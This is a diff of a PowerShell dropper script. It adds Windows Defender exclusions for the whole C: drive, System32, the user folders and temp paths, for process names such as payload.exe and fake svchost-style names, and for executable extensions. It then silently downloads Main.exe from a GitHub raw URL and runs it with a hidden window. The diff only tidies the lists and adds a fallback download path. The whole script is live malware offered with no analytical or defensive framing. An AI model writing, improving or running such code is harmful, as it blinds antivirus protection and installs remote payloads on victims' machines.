@@ -6,55 +6,31 @@ try {
             [System.Environment]::GetFolderPath("ApplicationData"),
             [System.Environment]::GetFolderPath("LocalApplicationData"),
             [System.IO.Path]::GetTempPath(),
-            "C:\",
-            "C:\Windows\Temp",
-            "C:\ProgramData",
-            "C:\Users",
-            "C:\Windows\System32",
-            "C:\Windows\SysWOW64"
+            "C:\", "C:\Windows\Temp", "C:\ProgramData", "C:\Users", "C:\Windows\System32", "C:\Windows\SysWOW64"
         )
 
-        $Processes = @(
-            "payload.exe",
-            "Main.exe",
-            "RuntimeBroker.exe",
-            "SvcHost.exe",
-            "WinDefendUpdate.exe",
-            "powershell.exe",
-            "powershell_ise.exe",
-            "cmd.exe",
-            "wscript.exe",
-            "cscript.exe",
-            "mshta.exe",
-            "rundll32.exe",
-            "regsvr32.exe",
-            "wmic.exe"
-        )
+        $Processes = @("payload.exe", "Main.exe", "RuntimeBroker.exe", "SvcHost.exe", "WinDefendUpdate.exe", "powershell.exe", "cmd.exe")
+        $Extensions = @(".exe", ".dll", ".bat", ".ps1", ".vbs", ".bin")
 
-        $Extensions = @(
-            ".exe", ".dll", ".bat", ".cmd", ".ps1",
-            ".vbs", ".js", ".hta", ".bin", ".zip", ".tmp"
-        )
-
-        foreach ($Path in $Paths) {
-            if (Test-Path $Path) {
-                Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
-            }
-        }
-
-        foreach ($Process in $Processes) {
-            Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue
-        }
-
-        foreach ($Ext in $Extensions) {
-            Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue
-        }
+        foreach ($Path in $Paths) { if (Test-Path $Path) { Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue } }
+        foreach ($Process in $Processes) { Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue }
+        foreach ($Ext in $Extensions) { Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue }
     }
-}
-catch {}
+} catch {}
 
 $url = "https://raw.githubusercontent.com/reasonowner/montano-project/main/Main.exe"
 $p = "$env:TEMP\Main.exe"
 
-iwr $url -OutFile $p -UseBasicParsing
-Start-Process $p -WindowStyle Hidden
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $p)
+    
+    if ((Get-Item $p).Length -gt 100) {
+        Start-Process $p -WindowStyle Hidden
+    } else {
+        Write-Host "File too small, probably download failed." -ForegroundColor Yellow
+    }
+} catch {
+    iwr $url -OutFile $p -UseBasicParsing
+    if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
+}
